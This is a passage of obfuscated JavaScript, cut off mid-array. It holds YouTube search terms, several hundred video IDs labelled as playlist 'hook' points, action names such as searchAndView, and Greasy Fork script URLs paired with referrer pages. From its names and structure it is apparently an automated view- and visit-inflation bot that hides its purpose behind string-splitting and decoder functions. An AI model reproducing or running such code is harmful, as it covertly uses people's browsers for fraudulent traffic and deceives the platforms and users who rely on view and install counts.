searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x14a * 0x5 + 0x1326 + -0xcaa)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](0x12b * 0x3 + -0x6a7 + 0x330)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](0x5d7 + -0xf92 + 0x9be);

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x10a3 * -0x1 + -0x187f + 0x2922);
    let h = e[f];
    return h;
  }, d(b, c);
}
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    Z(0x11) + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    Z(0x16) + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    a0(0x14) + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + 'e-tags',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': a0(0xd) + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + Y(0x17, 'bsBa') + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + Y(0x6, 'soA)') + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a0(0x2) + 'pts/405943' + '-moomoo-io' + Y(0xb, 'T)pL') + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + a0(0x2) + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
